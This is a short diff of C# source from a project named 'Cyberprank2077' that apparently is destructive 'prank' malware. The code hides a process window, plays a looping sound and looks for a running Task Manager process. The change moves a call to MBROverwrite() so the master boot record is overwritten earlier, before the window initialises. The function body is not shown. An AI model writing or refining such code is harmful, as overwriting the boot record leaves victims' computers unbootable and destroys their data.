@@ -103,11 +103,11 @@ namespace Cyberprank2077
             datetime.WindowStyle = ProcessWindowStyle.Hidden;
             Process.Start(datetime);
             Thread.Sleep(2500);
+            MBROverwrite();
             SoundPlayer jx = new SoundPlayer();
             jx = new SoundPlayer(@"C:\Windows\Cyberprank2077VVV.wav");
             jx.PlayLooping();
             InitializeComponent();
-            MBROverwrite();
             Process[] tsk = Process.GetProcessesByName("taskmgr");
             if(tsk.Length == 1)
             {
